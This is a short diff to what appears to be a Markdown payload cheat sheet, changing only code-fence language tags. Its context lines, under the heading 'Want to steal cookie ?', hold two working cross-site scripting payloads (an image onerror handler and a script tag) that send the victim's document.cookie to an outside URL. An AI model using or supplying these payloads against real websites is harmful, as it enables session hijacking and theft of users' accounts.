@@ -2,10 +2,10 @@
 
 ## Want to steal cookie ? 
 Try this:
-```
+```js
 <img src="" onerror="this.src='[URL]?cookie='+document.cookie;"></img>
 ```
-```
+```js
 <script>document.location='[URL]?c='+document.cookie</script>
 ```
 
